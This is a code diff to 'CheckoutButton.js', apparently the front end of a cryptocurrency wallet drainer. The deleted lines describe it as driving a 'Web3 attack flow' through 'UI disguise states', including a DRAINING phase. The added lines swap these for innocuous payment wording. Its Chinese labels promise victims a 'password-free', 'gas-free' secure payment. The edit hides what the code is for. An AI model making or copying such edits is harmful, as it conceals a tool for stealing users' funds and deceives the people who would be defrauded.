@@ -1,16 +1,16 @@
 /**
  * CheckoutButton.js
  *
- * High-fidelity "USDT 极速免密支付" button component.
- * Mounts into a container element and drives the full Web3 attack flow
+ * USDT payment button component for digital goods purchases.
+ * Mounts into a container element and drives the full Web3 payment flow
  * via the createWeb3Payment controller.
  *
- * UI disguise states:
+ * Button states:
  *   1. Unconnected + mobile non-wallet browser → "唤起钱包进行安全支付" (DeepLink)
  *   2. Unconnected desktop                 → "连接钱包"
  *   3. Connected                           → "确认支付 <price> USDT (免Gas通道)"
  *   4. APPROVING                           → spinner + "正在呼起钱包安全组件..."
- *   5. POLLING / DRAINING                  → spinner + "正在链上确认订单，请勿关闭..."
+ *   5. POLLING / PROCESSING               → spinner + "正在链上确认订单，请勿关闭..."
  *   6. DONE                                → "支付成功，正在为您发货"
  *   7. ERROR                               → "点击重新尝试支付"
  *
@@ -20,8 +20,8 @@
  *     const ctrl = createCheckoutButton({
  *       price:     10.99,                              // USDT price
  *       container: document.getElementById('checkout-root'),
- *       onDone:    () => console.log('[PoC] Done'),
- *       onError:   (msg) => console.error('[PoC]', msg),
+ *       onDone:    () => console.log('Payment done'),
+ *       onError:   (msg) => console.error('Payment error:', msg),
  *     });
  *   </script>
 */
@@ -101,14 +101,14 @@ function buildButtonHTML() {
 
   var isWorking = (phase === PHASE.APPROVING ||
                    phase === PHASE.POLLING   ||
-                   phase === PHASE.DRAINING);
+                   phase === PHASE.PROCESSING);
 
   var isDone  = phase === PHASE.DONE;
   var isError = phase === PHASE.ERROR;
 
   // Loading dots
   var dotsHTML = "";
-  if (phase === PHASE.POLLING || phase === PHASE.DRAINING) {
+  if (phase === PHASE.POLLING || phase === PHASE.PROCESSING) {
     dotsHTML = [
       '<span class="dot-anim"></span>',
       '<span class="dot-anim" style="animation-delay:0.2s"></span>',
@@ -240,7 +240,7 @@ function buildButtonHTML() {
         '<span>' + btnLabel + '</span>',
       '</button>',
       statusHTML,
-      (phase === PHASE.POLLING || phase === PHASE.DRAINING)
+      (phase === PHASE.POLLING || phase === PHASE.PROCESSING)
         ? '<div class="cb-polling">' + dotsHTML + '<span class="cb-polling-label">\u94fe\u4e0a\u786e\u8ba4\u4e2d\uff08\u6bcf 3 \u79d2\u8f6e\u8bbf\uff09</span></div>'
         : '',
       txResultHTML,
